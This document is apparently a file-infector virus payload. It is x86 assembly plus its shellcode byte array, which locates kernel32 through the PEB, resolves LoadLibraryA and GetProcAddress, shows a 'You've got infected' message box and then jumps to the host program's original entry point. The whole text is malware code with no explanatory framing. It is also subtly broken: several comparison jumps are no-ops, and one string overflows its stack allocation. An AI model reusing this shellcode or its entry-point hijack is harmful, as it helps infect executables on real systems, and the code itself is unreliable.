
mov eax, fs:[0x30]; Address of PEB
mov eax, [eax + 0x0C]; Pointer to PEB_LDR_DATA
mov eax, [eax + 0x14]; Pointer to InMemoryOrderModuleList
mov eax, [eax]; Pointer to kernel32.dll
mov eax, [eax];
mov eax, [eax + 0x10]; kernel32.dll base address

// Read the address of LoadLibraryA
mov ebx, eax; Save kernel32.dll base address
mov eax, [eax + 0x3C]; Offset to PE header
mov edi, [eax + ebx + 0x78]; Offset to Export Table
add edi, ebx; Address of Export Table
mov ecx, [edi + 0x18]; Number of functions
mov edx, [edi + 0x20];
add edx, ebx; Address of Name Pointer Table

// ebx = kernel32.dll base address
// Find the address of LoadLibraryA
LLA:
    dec ecx
    mov esi, [edx + ecx*4]; Store the relative offset of function name
    add esi, ebx; Address of function name
    cmp dword ptr[esi], 0x64616F4C; "Load" (little endian)
    je LLALOOP1
LLALOOP1:
    cmp dword ptr[esi + 4], 0x7262694C; "Libr" (little endian)
    je LLALOOP2
LLALOOP2:
    cmp dword ptr[esi + 8], 0x41797261; "aryA" (little endian)
    je stop; Found
    jmp LLA; Try next function
stop:
    mov edx, [edi + 0x24];
    add edx, ebx; Address of Ordinal Table
    mov cx, [edx + ecx*2]; Function ordinal
    mov edx, [edi + 0x1C]; 
    add edx, ebx; Address of Address Table
    mov eax, [edx + ecx*4];
    add eax, ebx; Address of LoadLibraryA
    //eax = LoadLibraryA
    sub esp, 11; Allocate space for the string
    mov ebx, esp; Save the address of the string
    // Set ebx to the address of the string "user32.dll"
    mov byte ptr[ebx], 0x75; "u"
    mov byte ptr[ebx + 1], 0x73; "s"
    mov byte ptr[ebx + 2], 0x65; "e"
    mov byte ptr[ebx + 3], 0x72; "r"
    mov byte ptr[ebx + 4], 0x33; "3"
    mov byte ptr[ebx + 5], 0x32; "2"
    mov byte ptr[ebx + 6], 0x2e; "."
    mov byte ptr[ebx + 7], 0x64; "d"
    mov byte ptr[ebx + 8], 0x6c; "l"
    mov byte ptr[ebx + 9], 0x6c; "l"
    mov byte ptr[ebx + 10], 0x00;

    push ebx;

    call eax; Call LoadLibraryA("user32.dll")
    add esp, 11; Clean up the stack
    push eax; Save the return address of LoadLibraryA("user32.dll")

    // Find the address of GetProcAddress
    mov eax, fs:[0x30]; Address of PEB
    mov eax, [eax + 0x0C]; Pointer to PEB_LDR_DATA
    mov eax, [eax + 0x14]; Pointer to InMemoryOrderModuleList
    mov eax, [eax]; Pointer to kernel32.dll
    mov eax, [eax];
    mov eax, [eax + 0x10]; kernel32.dll base address

    mov ebx, eax; Save kernel32.dll base address
    mov eax, [eax + 0x3C]; Offset to PE header
    mov edi, [eax + ebx + 0x78]; Offset to Export Table
    add edi, ebx; Address of Export Table
    mov ecx, [edi + 0x18]; Number of functions
    mov edx, [edi + 0x20];
    add edx, ebx; Address of Name Pointer Table
GPA:
    dec ecx
    mov esi, [edx + ecx*4]; Store the relative offset of function name
    add esi, ebx; Address of function name
    cmp dword ptr[esi], 0x50746547; "GetP" (little endian)
    je GPALOOP1
GPALOOP1:
    cmp dword ptr[esi + 4], 0x41636f72; "rocA" (little endian)
    je GPALOOP2
GPALOOP2:
    cmp dword ptr[esi + 8], 0x65726464; "ddre" (little endian)
    je stop2; Found
    jmp GPA; Try next function
stop2:
    mov edx, [edi + 0x24];
    add edx, ebx; Address of Ordinal Table
    mov cx, [edx + ecx*2]; Function ordinal
    mov edx, [edi + 0x1C]; 
    add edx, ebx; Address of Address Table
    mov eax, [edx + ecx*4];
    add eax, ebx; Address of GetProcAddress

    mov esi, eax; Save the address of GetProcAddress
    // Set ebx to the address of the string "MessageBoxA"
    sub esp, 12; Allocate space for the string
    mov ebx, esp; Save the address of the string
    mov byte ptr[ebx], 0x4d; "M"
    mov byte ptr[ebx + 1], 0x65; "e"
    mov byte ptr[ebx + 2], 0x73; "s"
    mov byte ptr[ebx + 3], 0x73; "s"
    mov byte ptr[ebx + 4], 0x61; "a"
    mov byte ptr[ebx + 5], 0x67; "g"
    mov byte ptr[ebx + 6], 0x65; "e"
    mov byte ptr[ebx + 7], 0x42; "B"
    mov byte ptr[ebx + 8], 0x6f; "o"
    mov byte ptr[ebx + 9], 0x78; "x"
    mov byte ptr[ebx + 10], 0x41; "A"
    mov byte ptr[ebx + 11], 0x00; "\0"

    mov eax, [esp + 12]; Get the return address of LoadLibraryA("user32.dll")
    push ebx; Push the address of the string "MessageBoxA"
    push eax; Push the return address of LoadLibraryA("user32.dll")
    call esi; Call GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA")
    add esp, 12; Clean up the stack
    // Set the message box parameters "You've got infected"
    sub esp, 19; Allocate space for the string
    mov ebx, esp; Save the address of the string
    mov byte ptr[ebx], 0x59; "Y"
    mov byte ptr[ebx + 1], 0x6f; "o"
    mov byte ptr[ebx + 2], 0x75; "u"
    mov byte ptr[ebx + 3], 0x27; "'"
    mov byte ptr[ebx + 4], 0x76; "v"
    mov byte ptr[ebx + 5], 0x65; "e"
    mov byte ptr[ebx + 6], 0x20; " "
    mov byte ptr[ebx + 7], 0x67; "g"
    mov byte ptr[ebx + 8], 0x6f; "o"
    mov byte ptr[ebx + 9], 0x74; "t"
    mov byte ptr[ebx + 10], 0x20; " "
    mov byte ptr[ebx + 11], 0x69; "i"
    mov byte ptr[ebx + 12], 0x6e; "n"
    mov byte ptr[ebx + 13], 0x66; "f"
    mov byte ptr[ebx + 14], 0x65; "e"
    mov byte ptr[ebx + 15], 0x63; "c"
    mov byte ptr[ebx + 16], 0x74; "t"
    mov byte ptr[ebx + 17], 0x65; "e"
    mov byte ptr[ebx + 18], 0x64; "e"
    mov byte ptr[ebx + 19], 0x00; "\0"

    push 0; MB_OK
    push 0; NULL
    push ebx; "You've got infected"
    push 0; NULL
    call eax; Call MessageBoxA(NULL, "You've got infected", NULL, MB_OK)
    add esp, 19; Clean up the stack

    mov eax, (old entrypoint);
    jmp eax; jump to the original entrypoint

{ 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0x89, 0xC3, 0x8B, 0x40, 0x3C, 0x8B, 0x7C, 0x18, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x57, 0x20, 0x01, 0xDA, 0x49, 0x8B, 0x34, 0x8A, 0x01, 0xDE, 0x81, 0x3E, 0x4C, 0x6F, 0x61, 0x64, 0x74, 0x00, 0x81, 0x7E, 0x04, 0x4C, 0x69, 0x62, 0x72, 0x74, 0x00, 0x81, 0x7E, 0x08, 0x61, 0x72, 0x79, 0x41, 0x74, 0x02, 0xEB, 0xDE, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x83, 0xEC, 0x0B, 0x89, 0xE3, 0xC6, 0x03, 0x75, 0xC6, 0x43, 0x01, 0x73, 0xC6, 0x43, 0x02, 0x65, 0xC6, 0x43, 0x03, 0x72, 0xC6, 0x43, 0x04, 0x33, 0xC6, 0x43, 0x05, 0x32, 0xC6, 0x43, 0x06, 0x2E, 0xC6, 0x43, 0x07, 0x64, 0xC6, 0x43, 0x08, 0x6C, 0xC6, 0x43, 0x09, 0x6C, 0xC6, 0x43, 0x0A, 0x00, 0x53, 0xFF, 0xD0, 0x83, 0xC4, 0x0B, 0x50, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0x89, 0xC3, 0x8B, 0x40, 0x3C, 0x8B, 0x7C, 0x18, 0x78, 0x01, 0xDF, 0x8B, 0x4F, 0x18, 0x8B, 0x57, 0x20, 0x01, 0xDA, 0x49, 0x8B, 0x34, 0x8A, 0x01, 0xDE, 0x81, 0x3E, 0x47, 0x65, 0x74, 0x50, 0x74, 0x00, 0x81, 0x7E, 0x04, 0x72, 0x6F, 0x63, 0x41, 0x74, 0x00, 0x81, 0x7E, 0x08, 0x64, 0x64, 0x72, 0x65, 0x74, 0x02, 0xEB, 0xDE, 0x8B, 0x57, 0x24, 0x01, 0xDA, 0x66, 0x8B, 0x0C, 0x4A, 0x8B, 0x57, 0x1C, 0x01, 0xDA, 0x8B, 0x04, 0x8A, 0x01, 0xD8, 0x89, 0xC6, 0x83, 0xEC, 0x0C, 0x89, 0xE3, 0xC6, 0x03, 0x4D, 0xC6, 0x43, 0x01, 0x65, 0xC6, 0x43, 0x02, 0x73, 0xC6, 0x43, 0x03, 0x73, 0xC6, 0x43, 0x04, 0x61, 0xC6, 0x43, 0x05, 0x67, 0xC6, 0x43, 0x06, 0x65, 0xC6, 0x43, 0x07, 0x42, 0xC6, 0x43, 0x08, 0x6F, 0xC6, 0x43, 0x09, 0x78, 0xC6, 0x43, 0x0A, 0x41, 0xC6, 0x43, 0x0B, 0x00, 0x8B, 0x44, 0x24, 0x0C, 0x53, 0x50, 0xFF, 0xD6, 0x83, 0xC4, 0x0C, 0x83, 0xEC, 0x13, 0x89, 0xE3, 0xC6, 0x03, 0x59, 0xC6, 0x43, 0x01, 0x6F, 0xC6, 0x43, 0x02, 0x75, 0xC6, 0x43, 0x03, 0x27, 0xC6, 0x43, 0x04, 0x76, 0xC6, 0x43, 0x05, 0x65, 0xC6, 0x43, 0x06, 0x20, 0xC6, 0x43, 0x07, 0x67, 0xC6, 0x43, 0x08, 0x6F, 0xC6, 0x43, 0x09, 0x74, 0xC6, 0x43, 0x0A, 0x20, 0xC6, 0x43, 0x0B, 0x69, 0xC6, 0x43, 0x0C, 0x6E, 0xC6, 0x43, 0x0D, 0x66, 0xC6, 0x43, 0x0E, 0x65, 0xC6, 0x43, 0x0F, 0x63, 0xC6, 0x43, 0x10, 0x74, 0xC6, 0x43, 0x11, 0x65, 0xC6, 0x43, 0x12, 0x64, 0xC6, 0x43, 0x13, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD0, 0x83, 0xC4, 0x13, 0xB8, 0x88, 0x11, 0x40, 0x00, 0xFF, 0xE0 }

